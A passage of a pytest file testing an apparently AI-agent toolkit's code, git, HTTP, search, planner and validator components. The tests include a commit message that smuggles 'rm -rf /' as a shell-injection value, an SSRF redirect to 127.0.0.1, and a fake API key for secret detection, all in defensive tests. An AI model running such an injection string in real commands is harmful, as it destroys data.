        tool = HttpTool()
        result = tool.safe_execute(action="get", url="")
        assert not result.success

    def test_http_get_real(self):
        """HTTP GET actually works against a real endpoint."""
        from hands.tools.http import HttpTool
        tool = HttpTool()
        # Use httpbin or a known-stable endpoint
        result = tool.safe_execute(action="head", url="https://httpbin.org/get")
        # May fail network-wise but validates the tool runs
        assert isinstance(result.success, bool)


# ============================================================
# Search Tool Tests
# ============================================================

class TestSearchTool:
    def test_grep_finds_pattern(self, tmp_workspace):
        """Grep finds text in files."""
        from hands.tools.search import SearchTool
        # Create test file
        with open(os.path.join(tmp_workspace, "test.py"), "w") as f:
            f.write("def hello_world():\n    return 'hello'\n")

        tool = SearchTool()
        result = tool.safe_execute(action="grep", path=tmp_workspace, pattern="hello_world")
        assert result.success
        assert "hello_world" in result.output

    def test_grep_no_match(self, tmp_workspace):
        """Grep returns no matches gracefully."""
        from hands.tools.search import SearchTool
        with open(os.path.join(tmp_workspace, "test.py"), "w") as f:
            f.write("nothing here\n")

        tool = SearchTool()
        result = tool.safe_execute(action="grep", path=tmp_workspace, pattern="nonexistent_xyz")
        assert result.success  # grep returns success even with no matches
        assert "no matches" in result.output.lower() or result.metadata.get("matches", 0) == 0

    def test_find_files(self, tmp_workspace):
        """Find locates files by pattern."""
        from hands.tools.search import SearchTool
        # Create test files
        with open(os.path.join(tmp_workspace, "app.py"), "w") as f:
            f.write("# app")
        with open(os.path.join(tmp_workspace, "utils.py"), "w") as f:
            f.write("# utils")
        with open(os.path.join(tmp_workspace, "readme.md"), "w") as f:
            f.write("# readme")

        tool = SearchTool()
        result = tool.safe_execute(action="find", path=tmp_workspace, pattern="*.py")
        assert result.success
        assert "app.py" in result.output
        assert "utils.py" in result.output
        assert "readme.md" not in result.output

    def test_count_lines_file(self, tmp_workspace):
        """Count lines for a single file."""
        from hands.tools.search import SearchTool
        filepath = os.path.join(tmp_workspace, "test.py")
        with open(filepath, "w") as f:
            f.write("line1\nline2\nline3\n")

        tool = SearchTool()
        result = tool.safe_execute(action="count_lines", path=filepath)
        assert result.success
        assert "3" in result.output

    def test_search_requires_pattern_for_grep(self):
        """Grep requires a pattern."""
        from hands.tools.search import SearchTool
        tool = SearchTool()
        result = tool.safe_execute(action="grep", path="/tmp")
        assert not result.success
        assert "pattern" in result.error.lower()


# ============================================================
# Task Generator Tests
# ============================================================

class TestTaskGenerator:
    @patch("hands.task_generator.create_message")
    def test_generate_tasks_returns_list(self, mock_create):
        """Task generator returns a list of tasks."""
        from hands.task_generator import generate_tasks

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_block = MagicMock()
        mock_block.text = json.dumps([
            {"task": "Build a React component library", "reasoning": "Apply KB claims", "priority": 1,
             "applies_claims": ["Use TypeScript"], "expected_complexity": "medium",
             "builds_on": "none", "success_criteria": "All tests pass"},
            {"task": "Build a REST API", "reasoning": "Practice patterns", "priority": 2,
             "applies_claims": [], "expected_complexity": "high",
             "builds_on": "none", "success_criteria": "API responds"},
        ])
        mock_response.content = [mock_block]
        mock_create.return_value = mock_response

        tasks = generate_tasks("test-domain")
        assert len(tasks) == 2
        assert tasks[0]["task"] == "Build a React component library"

    @patch("hands.task_generator.create_message")
    def test_get_next_task_returns_string(self, mock_create):
        """get_next_task returns a string."""
        from hands.task_generator import get_next_task

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_block = MagicMock()
        mock_block.text = json.dumps([
            {"task": "Build something cool", "reasoning": "why not", "priority": 1,
             "applies_claims": [], "expected_complexity": "low",
             "builds_on": "none", "success_criteria": "tests pass"},
        ])
        mock_response.content = [mock_block]
        mock_create.return_value = mock_response

        task = get_next_task("test-domain")
        assert isinstance(task, str)
        assert "Build something cool" in task


# ============================================================
# Enhanced Executor Tests
# ============================================================

class TestEnhancedExecutor:
    def test_context_summarization(self):
        """Context compression reduces conversation size."""
        from hands.executor import _summarize_old_steps, _estimate_conversation_size

        # Build a long conversation
        conversation = [
            {"role": "user", "content": "Execute this plan..." + "x" * 1000},
        ]
        for i in range(20):
            conversation.append({"role": "assistant", "content": f"Step {i} action" + "y" * 500})
            conversation.append({"role": "user", "content": f"TOOL RESULT (step {i+1}):\nSUCCESS: output {i}" + "z" * 500})

        original_size = _estimate_conversation_size(conversation)
        compressed = _summarize_old_steps(conversation, keep_recent=6)
        compressed_size = _estimate_conversation_size(compressed)

        assert compressed_size < original_size
        # First message preserved
        assert compressed[0]["content"].startswith("Execute this plan")
        # Recent messages preserved
        assert len(compressed) <= 8  # first + summary + 6 recent

    def test_conversation_size_estimation(self):
        """Size estimation works correctly."""
        from hands.executor import _estimate_conversation_size

        conv = [
            {"role": "user", "content": "hello"},
            {"role": "assistant", "content": "world"},
        ]
        assert _estimate_conversation_size(conv) == 10


# ============================================================
# Registry with new tools
# ============================================================

class TestExpandedRegistry:
    def test_registry_has_all_tools(self):
        """Default registry has all 5 tools."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        tools = registry.list_tools()
        assert "code" in tools
        assert "terminal" in tools
        assert "git" in tools
        assert "http" in tools
        assert "search" in tools
        assert len(tools) == 5

    def test_registry_claude_tools_format(self):
        """All tools produce valid Claude tool definitions."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        claude_tools = registry.get_claude_tools()
        assert len(claude_tools) == 5
        for tool in claude_tools:
            assert "name" in tool
            assert "description" in tool
            assert "input_schema" in tool
            assert tool["input_schema"]["type"] == "object"

    def test_registry_tool_descriptions(self):
        """Tool descriptions are informative."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        desc = registry.get_tool_descriptions()
        assert "code" in desc
        assert "terminal" in desc
        assert "git" in desc
        assert "http" in desc
        assert "search" in desc


# ============================================================
# V3 Improvements — Security fixes, artifact reading, workspace-aware planning
# ============================================================


class TestGitToolSecurityV3:
    """Tests for git tool shell injection fix (shell=False)."""

    def test_commit_with_special_chars_safe(self, tmp_workspace):
        """Commit message with shell metacharacters doesn't cause injection."""
        from hands.tools.git import GitTool
        tool = GitTool()
        # Init repo first
        tool.safe_execute(action="init", path=tmp_workspace)
        # Write a file and stage it
        test_file = os.path.join(tmp_workspace, "test.txt")
        with open(test_file, "w") as f:
            f.write("hello")
        tool.safe_execute(action="add", path=tmp_workspace)
        # Commit with dangerous-looking message (should be safe with shell=False)
        result = tool.safe_execute(
            action="commit",
            path=tmp_workspace,
            message='test"; rm -rf /; echo "pwned',
        )
        # Should succeed or fail gracefully — never execute the injected command
        # The message is passed as a list arg, not shell-interpreted
        assert result is not None

    def test_commit_uses_list_args(self):
        """Verify git commands use list args not shell strings."""
        import subprocess
        from hands.tools.git import GitTool
        tool = GitTool()
        # Patch subprocess.run to capture how it's called
        with patch("hands.tools.git.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0, stdout="test output", stderr=""
            )
            tool.execute(action="status", path="/tmp/test")
            call_args = mock_run.call_args
            # First positional arg should be a list, not a string
            cmd = call_args[0][0]
            assert isinstance(cmd, list), f"Expected list command, got: {type(cmd)}"
            assert cmd == ["git", "status", "--short"]
            # shell should be False
            assert call_args[1].get("shell") == False

    def test_commit_message_preserved_exactly(self, tmp_workspace):
        """Commit message with quotes is preserved correctly."""
        import subprocess
        from hands.tools.git import GitTool
        tool = GitTool()
        with patch("hands.tools.git.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                returncode=0, stdout="committed", stderr=""
            )
            tool.execute(
                action="commit",
                path=tmp_workspace,
                message="It's a \"test\" with 'quotes'"
            )
            cmd = mock_run.call_args[0][0]
            # Message should be the exact string, not escaped
            assert cmd[3] == "It's a \"test\" with 'quotes'"


class TestHttpToolSecurityV3:
    """Tests for HTTP redirect SSRF fix and new methods."""

    def test_redirect_handler_blocks_internal(self):
        """SafeRedirectHandler blocks redirects to internal IPs."""
        from hands.tools.http import _SafeRedirectHandler
        import urllib.request
        import urllib.error

        handler = _SafeRedirectHandler()
        req = urllib.request.Request("https://example.com")
        with pytest.raises(urllib.error.URLError, match="Redirect blocked"):
            handler.redirect_request(
                req, None, 302, "Found", {},
                "http://127.0.0.1/internal"
            )

    def test_redirect_handler_allows_safe(self):
        """SafeRedirectHandler allows redirects to safe URLs."""
        from hands.tools.http import _SafeRedirectHandler
        import urllib.request

        handler = _SafeRedirectHandler()
        req = urllib.request.Request("https://example.com")
        result = handler.redirect_request(
            req, None, 302, "Found", {},
            "https://www.example.com/page"
        )
        assert result is not None

    def test_put_method_in_schema(self):
        """HTTP tool schema includes PUT, PATCH, DELETE methods."""
        from hands.tools.http import HttpTool
        tool = HttpTool()
        actions = tool.input_schema["properties"]["action"]["enum"]
        assert "put" in actions
        assert "patch" in actions
        assert "delete" in actions
        assert "get" in actions
        assert "post" in actions
        assert "head" in actions


class TestValidatorArtifactReading:
    """Tests for validator reading actual file contents."""

    def test_read_artifact_files_reads_text(self, tmp_workspace):
        """_read_artifact_files reads text file contents."""
        from hands.validator import _read_artifact_files

        # Create test files
        py_file = os.path.join(tmp_workspace, "main.py")
        with open(py_file, "w") as f:
            f.write("print('hello world')")

        json_file = os.path.join(tmp_workspace, "package.json")
        with open(json_file, "w") as f:
            f.write('{"name": "test"}')

        files = _read_artifact_files([py_file, json_file])
        assert py_file in files
        assert json_file in files
        assert "hello world" in files[py_file]
        assert "test" in files[json_file]

    def test_read_artifact_files_skips_binary(self, tmp_workspace):
        """_read_artifact_files skips binary file extensions."""
        from hands.validator import _read_artifact_files

        png_file = os.path.join(tmp_workspace, "image.png")
        with open(png_file, "wb") as f:
            f.write(b"\x89PNG\r\n")

        py_file = os.path.join(tmp_workspace, "app.py")
        with open(py_file, "w") as f:
            f.write("import os")

        files = _read_artifact_files([png_file, py_file])
        assert png_file not in files
        assert py_file in files

    def test_read_artifact_files_handles_missing(self, tmp_workspace):
        """_read_artifact_files handles non-existent paths gracefully."""
        from hands.validator import _read_artifact_files

        files = _read_artifact_files([
            os.path.join(tmp_workspace, "nonexistent.py"),
            os.path.join(tmp_workspace, "also_missing.txt"),
        ])
        assert len(files) == 0

    def test_read_artifact_files_caps_size(self, tmp_workspace):
        """_read_artifact_files respects per-file size cap."""
        from hands.validator import _read_artifact_files, _MAX_FILE_CHARS

        big_file = os.path.join(tmp_workspace, "big.py")
        with open(big_file, "w") as f:
            f.write("x" * (_MAX_FILE_CHARS + 5000))

        files = _read_artifact_files([big_file])
        assert big_file in files
        assert len(files[big_file]) <= _MAX_FILE_CHARS + 100  # +100 for truncation message
        assert "truncated" in files[big_file]

    def test_read_artifact_files_deduplicates(self, tmp_workspace):
        """_read_artifact_files deduplicates paths."""
        from hands.validator import _read_artifact_files

        py_file = os.path.join(tmp_workspace, "app.py")
        with open(py_file, "w") as f:
            f.write("test")

        files = _read_artifact_files([py_file, py_file, py_file])
        assert len(files) == 1

    def test_read_artifact_files_prioritizes_key_files(self, tmp_workspace):
        """_read_artifact_files reads key files (package.json etc) first."""
        from hands.validator import _read_artifact_files

        # Create a bunch of files
        pkg = os.path.join(tmp_workspace, "package.json")
        with open(pkg, "w") as f:
            f.write('{"name": "priority"}')

        # package.json should be in the result even with other files
        other = os.path.join(tmp_workspace, "random.txt")
        with open(other, "w") as f:
            f.write("other")

        files = _read_artifact_files([other, pkg])
        assert pkg in files


class TestWorkspaceAwarePlanning:
    """Tests for planner workspace scanning."""

    def test_scan_workspace_returns_tree(self, tmp_workspace):
        """_scan_workspace produces a file tree and key files."""
        from hands.planner import _scan_workspace

        # Create a project structure
        os.makedirs(os.path.join(tmp_workspace, "src"))
        with open(os.path.join(tmp_workspace, "package.json"), "w") as f:
            f.write('{"name": "test-project"}')
        with open(os.path.join(tmp_workspace, "src", "index.ts"), "w") as f:
            f.write('console.log("hello")')

        result = _scan_workspace(tmp_workspace)
        assert "tree" in result
        assert "key_files" in result
        assert "stats" in result
        assert result["stats"]["files"] >= 2
        assert result["stats"]["dirs"] >= 1
        # package.json should be in key_files
        assert any("package.json" in k for k in result["key_files"])

    def test_scan_workspace_skips_node_modules(self, tmp_workspace):
        """_scan_workspace skips node_modules and .git directories."""
        from hands.planner import _scan_workspace

        os.makedirs(os.path.join(tmp_workspace, "node_modules", "express"))
        os.makedirs(os.path.join(tmp_workspace, ".git", "objects"))
        with open(os.path.join(tmp_workspace, "node_modules", "express", "index.js"), "w") as f:
            f.write("module.exports = {}")
        with open(os.path.join(tmp_workspace, "app.js"), "w") as f:
            f.write("const express = require('express')")

        result = _scan_workspace(tmp_workspace)
        assert "node_modules" not in result["tree"]
        assert ".git" not in result["tree"]
        assert "app.js" in result["tree"]

    def test_scan_workspace_empty_dir(self, tmp_workspace):
        """_scan_workspace handles empty directories."""
        from hands.planner import _scan_workspace

        result = _scan_workspace(tmp_workspace)
        assert result["stats"]["files"] == 0
        assert "tree" in result

    def test_scan_workspace_invalid_path(self):
        """_scan_workspace handles non-existent paths."""
        from hands.planner import _scan_workspace

        result = _scan_workspace("/nonexistent/path/xyz")
        assert result["tree"] == ""
        assert result["key_files"] == {}


class TestStepCriticality:
    """Tests for step criticality (required vs optional) in executor."""

    def test_optional_failure_doesnt_block(self):
        """Optional step failures should not mark execution as failed."""
        # Simulate step results with an optional failure
        step_results = [
            {"step": 1, "success": True, "criticality": "required"},
            {"step": 2, "success": False, "criticality": "optional"},  # optional fail
            {"step": 3, "success": True, "criticality": "required"},
        ]
        # Compute like the executor does
        failed_required = sum(1 for s in step_results
                              if not s["success"] and s.get("criticality") == "required")
        failed_optional = sum(1 for s in step_results
                              if not s["success"] and s.get("criticality") == "optional")
        successful = sum(1 for s in step_results if s["success"])

        success = failed_required == 0 and successful > 0
        assert success is True
        assert failed_required == 0
        assert failed_optional == 1

    def test_required_failure_blocks(self):
        """Required step failures should mark execution as failed."""
        step_results = [
            {"step": 1, "success": True, "criticality": "required"},
            {"step": 2, "success": False, "criticality": "required"},
        ]
        failed_required = sum(1 for s in step_results
                              if not s["success"] and s.get("criticality") == "required")
        successful = sum(1 for s in step_results if s["success"])
        success = failed_required == 0 and successful > 0
        assert success is False

    def test_plan_steps_get_default_criticality(self):
        """Plan steps default to 'required' criticality."""
        from hands.planner import plan
        # Mock the actual API call
        mock_plan = {
            "task_summary": "test",
            "steps": [
                {"step_number": 1, "tool": "code", "description": "write"},
                {"step_number": 2, "tool": "terminal", "description": "test"},
            ]
        }
        with patch("hands.planner.create_message") as mock_msg:
            mock_response = MagicMock()
            mock_response.usage.input_tokens = 100
            mock_response.usage.output_tokens = 50
            mock_response.content = [MagicMock(text=json.dumps(mock_plan))]
            mock_msg.return_value = mock_response

            with patch("hands.planner.log_cost"):
                result = plan(
                    goal="test",
                    tools_description="code, terminal",
                    domain="test",
                )
                assert result is not None
                for step in result["steps"]:
                    assert step.get("criticality") == "required"


class TestSearchToolTree:
    """Tests for the new tree action in SearchTool."""

    def test_tree_shows_structure(self, tmp_workspace):
        """Tree action displays directory structure."""
        from hands.tools.search import SearchTool
        tool = SearchTool()

        os.makedirs(os.path.join(tmp_workspace, "src", "components"))
        with open(os.path.join(tmp_workspace, "src", "index.ts"), "w") as f:
            f.write("export {}")
        with open(os.path.join(tmp_workspace, "src", "components", "Button.tsx"), "w") as f:
            f.write("export default function Button() {}")
        with open(os.path.join(tmp_workspace, "package.json"), "w") as f:
            f.write("{}")

        result = tool.safe_execute(action="tree", path=tmp_workspace)
        assert result.success
        assert "src/" in result.output
        assert "index.ts" in result.output
        assert "Button.tsx" in result.output
        assert "package.json" in result.output
        assert "directories" in result.output

    def test_tree_skips_node_modules(self, tmp_workspace):
        """Tree action skips node_modules and .git."""
        from hands.tools.search import SearchTool
        tool = SearchTool()

        os.makedirs(os.path.join(tmp_workspace, "node_modules", "express"))
        os.makedirs(os.path.join(tmp_workspace, "src"))
        with open(os.path.join(tmp_workspace, "src", "app.js"), "w") as f:
            f.write("test")

        result = tool.safe_execute(action="tree", path=tmp_workspace)
        assert result.success
        assert "node_modules" not in result.output
        assert "app.js" in result.output

    def test_tree_handles_empty_dir(self, tmp_workspace):
        """Tree action works on empty directories."""
        from hands.tools.search import SearchTool
        tool = SearchTool()

        result = tool.safe_execute(action="tree", path=tmp_workspace)
        assert result.success
        assert "0 files" in result.output

    def test_tree_nonexistent_path(self):
        """Tree action returns error for non-existent path."""
        from hands.tools.search import SearchTool
        tool = SearchTool()
        result = tool.safe_execute(action="tree", path="/nonexistent/xyz")
        assert not result.success


class TestCodeToolInsertAtLine:
    """Tests for the new insert_at_line action in CodeTool."""

    def test_insert_at_line_middle(self, tmp_workspace):
        """Insert content at a specific line in the middle of a file."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "test.py")
        tool.safe_execute(action="write", path=filepath, content="line1\nline2\nline3\n")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            result = tool.safe_execute(
                action="insert_at_line",
                path=filepath,
                line_number=2,
                content="inserted_line",
            )

        assert result.success
        with open(filepath) as f:
            content = f.read()
        assert "line1\ninserted_line\nline2\nline3\n" == content

    def test_insert_at_line_beginning(self, tmp_workspace):
        """Insert content at line 1 (beginning of file)."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "test.py")
        tool.safe_execute(action="write", path=filepath, content="existing\n")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            result = tool.safe_execute(
                action="insert_at_line",
                path=filepath,
                line_number=1,
                content="# header",
            )

        assert result.success
        with open(filepath) as f:
            lines = f.readlines()
        assert lines[0].startswith("# header")

    def test_insert_at_line_end(self, tmp_workspace):
        """Insert content past the last line (appends)."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "test.py")
        tool.safe_execute(action="write", path=filepath, content="line1\nline2\n")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            result = tool.safe_execute(
                action="insert_at_line",
                path=filepath,
                line_number=999,
                content="appended",
            )

        assert result.success
        with open(filepath) as f:
            content = f.read()
        assert content.endswith("appended\n")

    def test_insert_at_line_requires_content(self, tmp_workspace):
        """insert_at_line requires content parameter."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "test.py")
        with open(filepath, "w") as f:
            f.write("hello")

        result = tool.safe_execute(action="insert_at_line", path=filepath, line_number=1)
        assert not result.success

    def test_insert_at_line_requires_line_number(self, tmp_workspace):
        """insert_at_line requires line_number parameter."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "test.py")
        with open(filepath, "w") as f:
            f.write("hello")

        result = tool.safe_execute(action="insert_at_line", path=filepath, content="new")
        assert not result.success

    def test_insert_at_line_nonexistent_file(self, tmp_workspace):
        """insert_at_line returns error for non-existent file."""
        from hands.tools.code import CodeTool
        tool = CodeTool()

        filepath = os.path.join(tmp_workspace, "missing.py")
        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            result = tool.safe_execute(
                action="insert_at_line",
                path=filepath,
                line_number=1,
                content="test",
            )
        assert not result.success


class TestExecutionCostCeiling:
    """Tests for execution cost ceiling."""

    def test_cost_ceiling_constant_exists(self):
        """MAX_EXECUTION_COST constant is defined."""
        from hands.executor import MAX_EXECUTION_COST
        assert MAX_EXECUTION_COST > 0
        assert MAX_EXECUTION_COST <= 1.0  # Reasonable ceiling

    def test_cost_ceiling_value(self):
        """Cost ceiling is $0.50 by default."""
        from hands.executor import MAX_EXECUTION_COST
        assert MAX_EXECUTION_COST == 0.50


class TestTaskGeneratorCleanup:
    """Tests for task generator code cleanup."""

    def test_no_duplicate_re_import(self):
        """re module is imported at top level, not inside functions."""
        import hands.task_generator as tg
        import re
        # re should be in the module's namespace
        assert hasattr(tg, 're')
        assert tg.re is re

    @patch("hands.task_generator.create_message")
    @patch("hands.task_generator.log_cost")
    def test_generate_tasks_returns_list(self, mock_cost, mock_msg):
        """generate_tasks returns a list of task dicts."""
        from hands.task_generator import generate_tasks

        tasks_json = json.dumps([
            {"task": "Build X", "priority": 1, "reasoning": "test"},
            {"task": "Build Y", "priority": 2, "reasoning": "test"},
        ])
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text=tasks_json)]
        mock_msg.return_value = mock_response

        tasks = generate_tasks("test-domain")
        assert isinstance(tasks, list)
        assert len(tasks) == 2
        assert tasks[0]["task"] == "Build X"


# ============================================================
# v4: Planner Tool Name Validation
# ============================================================

class TestPlannerToolValidation:
    """Tests for tool name validation and remapping in planner."""

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_valid_tool_names_pass_through(self, mock_cost, mock_msg):
        """Steps with valid tool names are left unchanged."""
        from hands.planner import plan

        plan_json = json.dumps({
            "task_summary": "Test task",
            "steps": [
                {"step_number": 1, "tool": "code", "description": "Write file"},
                {"step_number": 2, "tool": "terminal", "description": "Run cmd"},
            ]
        })
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text=plan_json)]
        mock_msg.return_value = mock_response

        result = plan("test", "tools desc", available_tools=["code", "terminal", "git", "http", "search"])
        assert result["steps"][0]["tool"] == "code"
        assert result["steps"][1]["tool"] == "terminal"

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_hallucinated_tool_remapped(self, mock_cost, mock_msg):
        """Hallucinated tool names are remapped to real ones."""
        from hands.planner import plan

        plan_json = json.dumps({
            "task_summary": "Test task",
            "steps": [
                {"step_number": 1, "tool": "file", "description": "Write file"},
                {"step_number": 2, "tool": "bash", "description": "Run cmd"},
                {"step_number": 3, "tool": "grep", "description": "Search files"},
            ]
        })
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text=plan_json)]
        mock_msg.return_value = mock_response

        result = plan("test", "tools desc", available_tools=["code", "terminal", "git", "http", "search"])
        assert result["steps"][0]["tool"] == "code"
        assert result["steps"][1]["tool"] == "terminal"
        assert result["steps"][2]["tool"] == "search"

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_unknown_tool_defaults_to_terminal(self, mock_cost, mock_msg):
        """Completely unknown tools default to terminal."""
        from hands.planner import plan

        plan_json = json.dumps({
            "task_summary": "Test task",
            "steps": [
                {"step_number": 1, "tool": "quantum_flux_capacitor", "description": "Do magic"},
            ]
        })
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text=plan_json)]
        mock_msg.return_value = mock_response

        result = plan("test", "tools desc", available_tools=["code", "terminal", "git"])
        assert result["steps"][0]["tool"] == "terminal"

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_no_validation_without_available_tools(self, mock_cost, mock_msg):
        """Without available_tools, any tool name is accepted."""
        from hands.planner import plan

        plan_json = json.dumps({
            "task_summary": "Test task",
            "steps": [
                {"step_number": 1, "tool": "nonexistent", "description": "OK"},
            ]
        })
        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 50
        mock_response.content = [MagicMock(text=plan_json)]
        mock_msg.return_value = mock_response

        result = plan("test", "tools desc")
        assert result["steps"][0]["tool"] == "nonexistent"


# ============================================================
# v4: Planner Retry on Parse Failure
# ============================================================

class TestPlannerRetry:
    """Tests for planner retry logic on parse failure."""

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_retry_on_bad_json(self, mock_cost, mock_msg):
        """Planner retries when LLM returns invalid JSON."""
        from hands.planner import plan

        good_json = json.dumps({
            "task_summary": "Test task",
            "steps": [{"step_number": 1, "tool": "code", "description": "Write"}]
        })
        # First call: bad response, second: good
        bad_response = MagicMock()
        bad_response.usage.input_tokens = 100
        bad_response.usage.output_tokens = 50
        bad_response.content = [MagicMock(text="Here's the plan: I think we should...")]

        good_response = MagicMock()
        good_response.usage.input_tokens = 100
        good_response.usage.output_tokens = 50
        good_response.content = [MagicMock(text=good_json)]

        mock_msg.side_effect = [bad_response, good_response]
        result = plan("test", "tools desc", max_retries=2)
        assert result is not None
        assert result["steps"][0]["tool"] == "code"
        assert mock_msg.call_count == 2

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_returns_none_after_max_retries(self, mock_cost, mock_msg):
        """Planner returns None after exhausting retries."""
        from hands.planner import plan

        bad_response = MagicMock()
        bad_response.usage.input_tokens = 100
        bad_response.usage.output_tokens = 50
        bad_response.content = [MagicMock(text="Not JSON at all")]
        mock_msg.return_value = bad_response

        result = plan("test", "tools desc", max_retries=1)
        assert result is None
        # 1 initial + 1 retry = 2 calls
        assert mock_msg.call_count == 2

    @patch("hands.planner.create_message")
    @patch("hands.planner.log_cost")
    def test_retry_on_empty_steps(self, mock_cost, mock_msg):
        """Planner retries when plan has empty steps array."""
        from hands.planner import plan

        empty_json = json.dumps({"task_summary": "Test", "steps": []})
        good_json = json.dumps({
            "task_summary": "Test",
            "steps": [{"step_number": 1, "tool": "code", "description": "Write"}]
        })

        empty_resp = MagicMock()
        empty_resp.usage.input_tokens = 100
        empty_resp.usage.output_tokens = 50
        empty_resp.content = [MagicMock(text=empty_json)]

        good_resp = MagicMock()
        good_resp.usage.input_tokens = 100
        good_resp.usage.output_tokens = 50
        good_resp.content = [MagicMock(text=good_json)]

        mock_msg.side_effect = [empty_resp, good_resp]
        result = plan("test", "tools desc", max_retries=2)
        assert result is not None
        assert len(result["steps"]) == 1


# ============================================================
# v4: Strategy Templates
# ============================================================

class TestExecTemplates:
    """Tests for execution strategy templates."""

    def test_default_template_returned(self):
        """Default template is returned for unknown domains."""
        from hands.exec_templates import get_template, DEFAULT_TEMPLATE
        result = get_template("unknown-domain-xyz")
        assert result == DEFAULT_TEMPLATE
        assert "Planning Principles" in result

    def test_exact_domain_match(self):
        """Exact domain match returns specific template."""
        from hands.exec_templates import get_template
        result = get_template("nextjs-react")
        assert "Next.js" in result or "React" in result
        assert "create-next-app" in result

    def test_partial_domain_match(self):
        """Partial keywords in domain name match to correct template."""
        from hands.exec_templates import get_template
        # "python" is a key in DOMAIN_TEMPLATES
        result = get_template("my-python-project")
        assert "Python" in result or "PEP 8" in result

    def test_list_templates(self):
        """list_templates returns default + all domain templates."""
        from hands.exec_templates import list_templates
        templates = list_templates()
        assert "default" in templates
        assert "nextjs-react" in templates
        assert "python" in templates
        assert len(templates) >= 4


# ============================================================
# v4: Validator Static Checks
# ============================================================

class TestValidatorStaticChecks:
    """Tests for the static pre-check system in the validator."""

    def test_missing_file_detected(self, tmp_path):
        """Static checks detect missing files."""
        from hands.validator import _run_static_checks
        result = _run_static_checks([str(tmp_path / "nonexistent.py")])
        assert result["checks_run"] >= 1
        assert any(i["check"] == "exists" for i in result["issues"])

    def test_empty_file_detected(self, tmp_path):
        """Static checks detect empty files."""
        from hands.validator import _run_static_checks
        empty_file = tmp_path / "empty.py"
        empty_file.write_text("")
        result = _run_static_checks([str(empty_file)])
        assert any(i["check"] == "not_empty" for i in result["issues"])

    def test_valid_json_passes(self, tmp_path):
        """Valid JSON files pass the json_valid check."""
        from hands.validator import _run_static_checks
        json_file = tmp_path / "package.json"
        json_file.write_text('{"name": "test", "version": "1.0.0"}')
        result = _run_static_checks([str(json_file)])
        assert any(p["check"] == "json_valid" for p in result["passes"])

    def test_invalid_json_detected(self, tmp_path):
        """Invalid JSON files are flagged."""
        from hands.validator import _run_static_checks
        json_file = tmp_path / "bad.json"
        json_file.write_text('{name: test, missing quotes}')
        result = _run_static_checks([str(json_file)])
        assert any(i["check"] == "json_valid" for i in result["issues"])

    def test_python_syntax_error_detected(self, tmp_path):
        """Python files with syntax errors are flagged."""
        from hands.validator import _run_static_checks
        py_file = tmp_path / "bad.py"
        py_file.write_text("def foo(\n    return 42\n")
        result = _run_static_checks([str(py_file)])
        assert any(i["check"] == "python_syntax" for i in result["issues"])

    def test_valid_python_passes(self, tmp_path):
        """Valid Python files pass syntax check."""
        from hands.validator import _run_static_checks
        py_file = tmp_path / "good.py"
        py_file.write_text("def foo():\n    return 42\n")
        result = _run_static_checks([str(py_file)])
        assert any(p["check"] == "python_syntax" for p in result["passes"])

    def test_hardcoded_secret_detected(self, tmp_path):
        """Hardcoded secrets in code files are flagged."""
        from hands.validator import _run_static_checks
        py_file = tmp_path / "config.py"
        py_file.write_text('API_KEY = "sk-ant-abc123456789012345678901234567890"\n')
        result = _run_static_checks([str(py_file)])
        assert any(i["check"] == "no_hardcoded_secrets" for i in result["issues"])

    def test_no_issues_for_clean_file(self, tmp_path):
        """Clean files pass all checks with no issues."""
        from hands.validator import _run_static_checks
        py_file = tmp_path / "clean.py"
        py_file.write_text('"""A clean module."""\n\ndef greet(name: str) -> str:\n    return f"Hello, {name}!"\n')
        result = _run_static_checks([str(py_file)])
        assert len(result["issues"]) == 0
        assert result["checks_run"] >= 2

    def test_html_structure_check(self, tmp_path):
        """HTML files are checked for basic structure."""
        from hands.validator import _run_static_checks
        html_file = tmp_path / "page.html"
        html_file.write_text("<!DOCTYPE html>\n<html><body>Hi</body></html>")
        result = _run_static_checks([str(html_file)])
        assert any(p["check"] == "html_structure" for p in result["passes"])

    def test_html_missing_structure_detected(self, tmp_path):
        """HTML files without basic tags are flagged."""
        from hands.validator import _run_static_checks
        html_file = tmp_path / "bad.html"
        html_file.write_text("<div>Not a real HTML document</div>")
        result = _run_static_checks([str(html_file)])
        assert any(i["check"] == "html_structure" for i in result["issues"])


# ============================================================
# v4: Cross-Domain Execution Principles
# ============================================================

class TestExecCrossDomain:
